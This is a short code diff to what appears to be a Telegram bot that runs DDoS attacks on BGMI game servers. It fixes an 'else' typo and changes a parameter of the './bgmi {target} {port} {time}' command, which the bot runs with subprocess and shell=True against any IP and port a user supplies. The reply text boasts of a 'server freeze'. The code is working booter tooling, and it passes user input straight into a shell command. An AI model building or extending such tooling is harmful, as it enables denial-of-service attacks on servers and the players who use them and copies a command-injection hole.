@@ -69,7 +69,7 @@ def clear_logs():
         with open(LOG_FILE, "r+") as file:
             if file.read() == "":
                 response = "ᒪOᘜ ᗩᒪᖇᗴᗩᗪY ᗪᗴᒪᗴTᗴᗪ, ᑎO ᒪOᘜ ᗪᗩTᗩ ᖴOᑌᑎᗪ."
-            lse:
+            else:
                 file.truncate(0)
                 response = "ᒪOᘜՏ ᗪᗴᒪᗴTᗴᗪ ՏᑌᑕᑕᗴՏՏᖴᑌᒪᒪY"
     except FileNotFoundError:
@@ -248,7 +248,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 270"
+                full_command = f"./bgmi {target} {port} {time} 70"
                 subprocess.run(full_command, shell=True)
                 response = f"Տᗴᖇᐯᗴᖇ ᖴᖇᗴᗴᘔᗴ ᗪOᑎᗴ Oᑎ TᕼIՏ Iᑭ:- {target}:{port} /n🇯 🇦 🇮  🇸 🇭 🇷 🇪 🇪  🇷 🇦 🇲  ️"
         
